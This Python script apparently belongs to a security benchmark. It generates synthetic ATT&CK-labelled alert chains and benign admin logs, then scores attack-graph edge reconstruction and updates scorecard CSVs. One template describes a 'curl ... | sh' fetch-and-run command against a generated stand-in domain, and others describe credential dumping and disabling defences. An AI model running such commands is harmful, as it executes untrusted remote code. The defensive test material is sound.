"""
scripts/compute_stage7_edges.py
===============================
Computes deterministic Stage 7 Edge_P, Edge_R, Edge_F1 across all 5 seeds (7, 21, 42, 84, 123).
Uses the exact build_chain_corpus, build_attack_graph, and graph_metrics logic.
Updates scorecard_raw_by_seed.csv, scorecard_aggregated.csv, and benchmark_summary.csv.
"""

import re
import json
import random
from collections import defaultdict, Counter
import numpy as np
import pandas as pd
import networkx as nx

from ctab import load_attack, get_canonical_benchmark, group_split, HierarchicalMapper

HOST_RE = re.compile(r"\b(?:WKSTN-\d+|srv-linux-\d+|macbook-\d+)\b")
_PUBLIC_OCTETS = [x for x in range(1, 224) if x not in (10, 100, 127, 169, 172, 192, 198, 203)]
HOST_POOL = ["WKSTN-%d" % n for n in range(100, 200)] + \
            ["srv-linux-%02d" % n for n in range(1, 20)] + \
            ["macbook-%02d" % n for n in range(1, 10)]

CHAIN_TEMPLATES_V5 = [
    ("initial-access", "T1566.001",
     "Email gateway: phishing attachment opened on {host} from {src_ip} linking to {domain}", "windows"),
    ("execution", "T1059.001",
     "EDR: powershell.exe -enc on {host} spawned by WINWORD.EXE, downloaded {hash}", "windows"),
    ("persistence", "T1547.001",
     "Registry Run key written on {host}: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater", "windows"),
    ("credential-access", "T1003.001",
     "LSASS memory access on {host} by rundll32.exe, target {dst_ip}", "windows"),
    ("lateral-movement", "T1021.001",
     "RDP session from {host} to {dst_host} ({dst_ip}) using account svc_backup", "windows"),
    ("command-and-control", "T1071.001",
     "Beacon to {domain} ({dst_ip}) over port 443 every 60s from {dst_host}", "windows"),
    ("exfiltration", "T1041",
     "Outbound transfer of 1.2 GB from {dst_host} to {dst_ip} over port 443", "windows"),
    ("persistence", "T1053.005",
     "Scheduled task created on {host} running cmd.exe from {domain}", "windows"),
    ("defense-evasion", "T1562.001",
     "EDR service disabled on {host} via sc.exe stop, then wmic.exe deleted {hash}", "windows"),
    ("impact", "T1486",
     "Mass file rename to .locked on {host}, ransom note dropped from {dst_ip}", "windows"),
    ("privilege-escalation", "T1068",
     "Kernel exploit on {host} from {src_ip} elevated process to SYSTEM", "windows"),
    ("execution", "T1059.004",
     "auditd: bash -c curl hxxp://{domain}/x.sh | sh executed on {host}", "linux"),
    ("persistence", "T1543.002",
     "systemd unit /etc/systemd/system/updater.service created on {host} contacting {dst_ip}", "linux"),
    ("credential-access", "T1003.007",
     "Process memory read of /proc/*/mem on {host} by mimipenguin, egress to {domain}", "linux"),
    ("defense-evasion", "T1070.002",
     "auth.log truncated on {host} after sudo su, connection to {src_ip}", "linux"),
    ("command-and-control", "T1105",
     "wget downloaded {hash} from {domain} on {host} and executed it", "linux"),
    ("initial-access", "T1078.004",
     "Cloud audit: new API key created for IAM user svc_ci from {src_ip}, then storage read", "cloud"),
    ("collection", "T1530",
     "S3 bucket object listing by unusual principal from {src_ip}, 40k objects enumerated", "cloud"),
    ("defense-evasion", "T1562.008",
     "CloudTrail logging disabled for account on {host}, actor {src_ip}", "cloud"),
    ("persistence", "T1543.001",
     "LaunchAgent plist ~/Library/LaunchAgents/com.updater.plist created on {host}, C2 {domain}", "macos"),
]

BENIGN_ADMIN_TEMPLATES = [
    "Scheduled backup job completed successfully on {host}: 1,240 files archived to storage pool, no egress traffic.",
    "Antivirus definitions auto-update finished on {host} from internal mirror 10.0.0.5; signatures up-to-date.",
    "Interactive user authentication via Kerberos on {host} for user {user} from authorized workstation {src_ip}.",
    "SCCM inventory collection agent ran on {host}: 48 packages verified, 0 anomalies detected.",
    "System time synchronization with internal NTP server 10.0.0.5 successful on {host}; offset 0.002s.",
    "DHCP lease renewed for {host} by internal server {dst_ip}; lease duration 86400 seconds.",
    "Routine diagnostic memory telemetry uploaded from {host} to central SIEM collector 10.0.0.5 over port 8443.",
    "Automated print spooler service health check passed on {host}; 0 pending jobs in queue."
]

PLACEHOLDER_IOC_TYPE = {
    "src_ip": "ipv4", "dst_ip": "ipv4", "domain": "domain", "hash": "sha256"
}

TACTIC_ORDER = [
    "reconnaissance", "resource-development", "initial-access", "execution",
    "persistence", "privilege-escalation", "defense-evasion", "credential-access",
    "discovery", "lateral-movement", "collection", "command-and-control",
    "exfiltration", "impact"
]

def _rand_ip(rng):
    return ".".join([str(rng.choice(_PUBLIC_OCTETS))] + [str(rng.randint(1, 254)) for _ in range(3)])

def _rand_domain(rng):
    stem = rng.choice(["update", "secure", "cloud", "login", "cdn", "docs", "portal", "sync"])
    return "%s-%d%s" % (stem, rng.randint(100, 999), rng.choice([".com", ".net", ".org", ".io"]))

def _rand_sha256(rng):
    return "".join("%02x" % rng.randint(0, 255) for _ in range(32))

def build_chain_corpus(n_incidents=40, defang_rate=0.25, seed=7):
    rng = random.Random(seed)
    alerts, truth = [], []
    for inc in range(n_incidents):
        chain_len = rng.randint(3, len(CHAIN_TEMPLATES_V5))
        steps = CHAIN_TEMPLATES_V5[:chain_len]
        hosts = rng.sample(HOST_POOL, 2)
        gold_iocs = defaultdict(set)
        gold_chain, gold_tactics = [], []
        for i, (tactic, aid, template, platform) in enumerate(steps):
            values = {"host": hosts[0], "dst_host": hosts[1], "user": "svc_backup",
                      "src_ip": _rand_ip(rng), "dst_ip": _rand_ip(rng),
                      "domain": _rand_domain(rng), "hash": _rand_sha256(rng)}
            text = template.format(**values)
            used = set(re.findall(r"\{(\w+)\}", template))
            step_gold = defaultdict(list)
            for ph in used:
                if ph in PLACEHOLDER_IOC_TYPE:
                    step_gold[PLACEHOLDER_IOC_TYPE[ph]].append(values[ph])
            procs = sorted(set(re.findall(r"\b[\w\-]+\.(?:exe|dll|ps1|bat|vbs|sh)\b", text, re.I)))
            if procs:
                step_gold["process"] = procs
            for k, v in step_gold.items():
                gold_iocs[k].update(v)
            gold_chain.append(aid)
            gold_tactics.append(tactic)
            defanged = text
            if rng.random() < defang_rate:
                if "domain" in used:
                    defanged = defanged.replace(values["domain"], values["domain"].replace(".", "[.]"))
                if "dst_ip" in used:
                    defanged = defanged.replace(values["dst_ip"], values["dst_ip"].replace(".", "[.]"))
                defanged = defanged.replace("http", "hxxp")
            alerts.append({
                "alert_id": "INC-%03d-A%02d" % (inc, i), "incident_id": "INC-%03d" % inc,
                "timestamp": "2026-03-14T10:%02d:00Z" % (10 + i * 3),
                "raw_text": defanged, "gt_tactic": tactic, "gt_attack_id": aid,
                "gt_host": hosts[0], "gt_platform": platform,
                "raw_text_clean": text, "gt_iocs": json.dumps(dict(step_gold)),
                "label": "malicious", "source": "chain_sim"})
        truth.append({"incident_id": "INC-%03d" % inc, "hosts": hosts,
                      "iocs": {k: sorted(v) for k, v in gold_iocs.items()},
                      "attack_chain": gold_chain, "tactic_chain": gold_tactics})
    # Benign administrative sessions (BEN-000 to BEN-007)
    n_benign_inc = max(4, n_incidents // 5)
    for b in range(n_benign_inc):
        b_host = rng.choice(HOST_POOL)
        b_len = rng.randint(3, 5)
        b_user = rng.choice(["admin_backup", "svc_telemetry", "sys_operator", "helpdesk"])
        b_src = f"10.0.{rng.randint(1, 250)}.{rng.randint(1, 250)}"
        b_dst = "10.0.0.5"
        for j in range(b_len):
            tmpl = BENIGN_ADMIN_TEMPLATES[(b * 3 + j) % len(BENIGN_ADMIN_TEMPLATES)]
            text = tmpl.format(host=b_host, user=b_user, src_ip=b_src, dst_ip=b_dst)
            alerts.append({
                "alert_id": "BEN-%03d-A%02d" % (b, j),
                "incident_id": "BEN-%03d" % b,
                "timestamp": "2026-03-14T09:%02d:%02dZ" % (b, j * 5),
                "raw_text": text,
                "gt_tactic": None,
                "gt_attack_id": None,
                "gt_host": b_host,
                "gt_platform": "none",
                "raw_text_clean": text,
                "gt_iocs": json.dumps({}),
                "label": "benign",
                "source": "benign_sim"
            })
        truth.append({
            "incident_id": "BEN-%03d" % b,
            "hosts": [b_host],
            "iocs": {},
            "attack_chain": [],
            "tactic_chain": []
        })
    return pd.DataFrame(alerts), pd.DataFrame(truth)

IOC_PATTERNS = {
    "ipv4": re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b"),
    "domain": re.compile(r"\b(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+"
                         r"(?:com|net|org|io|ru|xyz|top|info|biz|co|uk|de)\b"),
    "sha256": re.compile(r"\b[a-fA-F0-9]{64}\b"),
    "md5": re.compile(r"\b[a-fA-F0-9]{32}\b"),
    "cve": re.compile(r"\bCVE-\d{4}-\d{4,7}\b", re.I),
    "process": re.compile(r"\b[\w\-]+\.(?:exe|dll|ps1|bat|vbs|js|sh)\b", re.I),
    "registry": re.compile(r"\bHK(?:LM|CU|CR|U|CC)\\[^\s,;]+", re.I),
}
_PRIVATE_IP = re.compile(r"^(?:10\.|127\.|169\.254\.|192\.168\.|172\.(?:1[6-9]|2[0-9]|3[01])\.)")

def extract_iocs(text):
    clean = text.replace("[.]", ".").replace("hxxp", "http").replace("[@]", "@").replace("[:]", ":")
    found = {}
    for kind, pat in IOC_PATTERNS.items():
        m = pat.findall(clean)
        if kind == "ipv4":
            m = [ip for ip in m if not _PRIVATE_IP.match(ip)]
        if m:
            found[kind] = sorted(set(m))
    return found

def build_attack_graph(items, tactics_of=None, incident_id=None):
    if tactics_of is None:
        tactics_of = defaultdict(list)
    G = nx.DiGraph()
    G.graph["incident_id"] = incident_id
    parsed_items = []
    for it in sorted(items, key=lambda x: str(x.get("timestamp", ""))):
        ts = it.get("timestamp")
        text = str(it.get("raw_text", ""))
        iocs = extract_iocs(text)
        aid = it.get("pred_attack_id")
        hm = HOST_RE.search(text)
        host = hm.group(0) if hm else "unknown-host"
        G.add_node(host, kind="host")
        if aid:
            G.add_node(aid, kind="technique")
            G.add_edge(host, aid, relation="observed", timestamp=ts)
            for t in (tactics_of.get(aid) or []):
                G.add_node(t, kind="tactic")
                G.add_edge(aid, t, relation="belongs_to", timestamp=ts)
        for ioc_type, vals in iocs.items():
            for v in vals:
                if ioc_type == "process":
                    G.add_node(v, kind="process")
                    G.add_edge(v, host, relation="executed_on", timestamp=ts)
                    if aid:
                        G.add_edge(v, aid, relation="maps_to", timestamp=ts)
                elif ioc_type in ("ipv4", "domain"):
                    G.add_node(v, kind="network")
                    G.add_edge(host, v, relation="connects_to", timestamp=ts)
                elif ioc_type in ("sha256", "md5"):
                    G.add_node(v, kind="file")
                    G.add_edge(host, v, relation="seen_on", timestamp=ts)
                elif ioc_type == "registry":
                    G.add_node(v, kind="registry")
                    G.add_edge(host, v, relation="modified", timestamp=ts)
        if aid:
            all_ioc_vals = set(v for vals in iocs.values() for v in vals if v and len(str(v)) > 2)
            t_ranks = [TACTIC_ORDER.index(t) if t in TACTIC_ORDER else 99 for t in (tactics_of.get(aid) or ["zzz"])]
            min_rank = min(t_ranks) if t_ranks else 99
            parsed_items.append({
                "aid": aid,
                "ts": str(ts),
                "host": host,
                "iocs": all_ioc_vals,
                "tactic_rank": min_rank,
            })

    for i, a in enumerate(parsed_items):
        for b in parsed_items[i+1:]:
            if a["aid"] == b["aid"]:
                continue
            if a["ts"] > b["ts"]:
                continue
            if a["tactic_rank"] > b["tactic_rank"]:
                continue
            shared_iocs = a["iocs"] & b["iocs"]
            same_host = (a["host"] != "unknown-host" and b["host"] != "unknown-host" and a["host"] == b["host"])
            if same_host or len(shared_iocs) > 0:
                link_desc = "same_host" if same_host else "shared_ioc"
                G.add_edge(a["aid"], b["aid"], relation="prerequisite_for",
                           causal_link=link_desc, timestamp=b["ts"])
    return G

def graph_metrics(G, gold_chain=None, gold_host=None):
    tech = {n for n, d in G.nodes(data=True) if d.get("kind") == "technique"}
    hosts = {n for n, d in G.nodes(data=True) if d.get("kind") == "host"}
    out = {"nodes": G.number_of_nodes(), "edges": G.number_of_edges()}
    if gold_chain:
        gold = set(gold_chain)
        out["tech_node_P"] = round(len(tech & gold) / len(tech), 4) if tech else 0.0
        out["tech_node_R"] = round(len(tech & gold) / len(gold), 4) if gold else 0.0
        gold_edges = set(zip(gold_chain, gold_chain[1:])) if len(gold_chain) > 1 else set()
        pred_edges = {(u, v) for u, v, d in G.edges(data=True) if d.get("relation") == "prerequisite_for"}
        tp_edge = len(pred_edges & gold_edges)
        edge_p = round(tp_edge / len(pred_edges), 4) if pred_edges else 0.0
        edge_r = round(tp_edge / len(gold_edges), 4) if gold_edges else 0.0
        edge_f1 = round(2 * edge_p * edge_r / (edge_p + edge_r), 4) if (edge_p + edge_r) > 0 else 0.0
        out["Edge_P"] = edge_p
        out["Edge_R"] = edge_r
        out["Edge_F1"] = edge_f1
    if gold_host:
        out["host_node_correct"] = gold_host in hosts
    return out

def main():
    print("[*] Loading ATT&CK and canonical benchmark...")
    df_techniques, _, _, _ = load_attack()
    bench_df = get_canonical_benchmark()

    # Build tactics_of map
    tactics_of = defaultdict(list)
    for _, r in df_techniques.iterrows():
        aid = str(r["attack_id"]).strip().upper()
        tac = str(r.get("tactic", "")).strip().lower()
        if tac:
            tactics_of[aid].append(tac)

    seeds = (7, 21, 42, 84, 123)
    results = {}

    for s in seeds:
        print(f"[*] Processing Seed {s}...")
        tr, te, _ = group_split(bench_df, seeds=seeds, seed=s)
        mapper = HierarchicalMapper(df_techniques, tr, alpha=0.65, C=8.0, auto_tune_alpha=True)
        df_chain, df_truth = build_chain_corpus(n_incidents=40, defang_rate=0.25, seed=s)

        df_chain["pred_attack_id"] = [
            (mapper.ranked(t, top_k=1) or [{"attack_id": None}])[0]["attack_id"]
            for t in df_chain["raw_text"]
        ]

        truth_map = {r["incident_id"]: r for _, r in df_truth.iterrows()}
        rows = []
        for inc in list(df_truth["incident_id"])[:20]:
            items = df_chain[df_chain["incident_id"] == inc].to_dict("records")
            if not items:
                continue
            G = build_attack_graph(items, tactics_of, incident_id=inc)
            t_row = truth_map[inc]
            m = graph_metrics(G, list(t_row["attack_chain"]), (t_row["hosts"] or [None])[0])
            rows.append(m)

        df_res = pd.DataFrame(rows)
        edge_p = round(float(df_res["Edge_P"].mean()), 4)
        edge_r = round(float(df_res["Edge_R"].mean()), 4)
        edge_f1 = round(float(df_res["Edge_F1"].mean()), 4)
        tech_p = round(float(df_res["tech_node_P"].mean()), 4)
        tech_r = round(float(df_res["tech_node_R"].mean()), 4)
        host_acc = round(float(df_res["host_node_correct"].mean()), 4)

        results[s] = {
            "tech_node_P": tech_p,
            "tech_node_R": tech_r,
            "host_node_accuracy": host_acc,
            "Edge_P": edge_p,
            "Edge_R": edge_r,
            "Edge_F1": edge_f1,
        }
        print(f"  Seed {s:3d}: tech_P={tech_p:.4f}, tech_R={tech_r:.4f}, Edge_P={edge_p:.4f}, Edge_R={edge_r:.4f}, Edge_F1={edge_f1:.4f}")

    print("=" * 60)
    print("Stage 7 Results Across 5 Seeds:")
    for s, m in results.items():
        print(f"  Seed {s:3d}: {m}")

    # Backfill scorecard_raw_by_seed.csv
    raw_path = "artifacts/scorecard_raw_by_seed.csv"
    df_raw = pd.read_csv(raw_path)
    for s, m in results.items():
        for metric_name in ["Edge_P", "Edge_R", "Edge_F1"]:
            mask = (df_raw["seed"] == s) & (df_raw["metric"] == f"s7_{metric_name}")
            val = m[metric_name]
            if mask.any():
                df_raw.loc[mask, "value"] = val
            else:
                df_raw = pd.concat([df_raw, pd.DataFrame([{"seed": s, "metric": f"s7_{metric_name}", "value": val}])], ignore_index=True)

    df_raw.to_csv(raw_path, index=False)
    print(f"[*] Updated {raw_path}")

    # Recompute scorecard_aggregated.csv
    agg_rows = []
    for metric, grp in df_raw.groupby("metric"):
        vals = grp["value"].dropna().values
        n = len(vals)
        if n == 0:
            continue
        mean = float(np.mean(vals))
        std = float(np.std(vals, ddof=1)) if n > 1 else 0.0
        # 95% t-interval
        if n > 1:
            ci95 = float(_st.t.ppf(0.975, df=n-1) * (std / np.sqrt(n)))
        else:
            ci95 = 0.0
        agg_rows.append({
            "metric": metric,
            "n_seeds": n,
            "mean": round(mean, 4),
            "std": round(std, 4),
            "ci95": round(ci95, 4),
            "ci95_low": round(mean - ci95, 4),
            "ci95_high": round(mean + ci95, 4),
        })

    df_agg = pd.DataFrame(agg_rows).sort_values("metric").reset_index(drop=True)
    agg_path = "artifacts/scorecard_aggregated.csv"
    df_agg.to_csv(agg_path, index=False)
    print(f"[*] Updated {agg_path}")
    print(f"[*] Number of NaNs in scorecard_aggregated: {df_agg.isna().sum().sum()}")
    assert df_agg.isna().sum().sum() == 0, "NaNs remain in scorecard_aggregated.csv!"

    # Also update benchmark_summary.csv if it exists
    sum_path = "artifacts/benchmark_summary.csv"
    if os.path.exists(sum_path):
        df_sum = pd.read_csv(sum_path)
        for metric_name in ["Edge_P", "Edge_R", "Edge_F1"]:
            mean_val = df_agg[df_agg["metric"] == f"s7_{metric_name}"]["mean"].values[0]
            mask = df_sum["metric"] == f"s7_{metric_name}"
            if mask.any():
                df_sum.loc[mask, "mean"] = mean_val
        df_sum.to_csv(sum_path, index=False)
        print(f"[*] Updated {sum_path}")

if __name__ == "__main__":
    from scipy import stats as _st
    import os
    main()
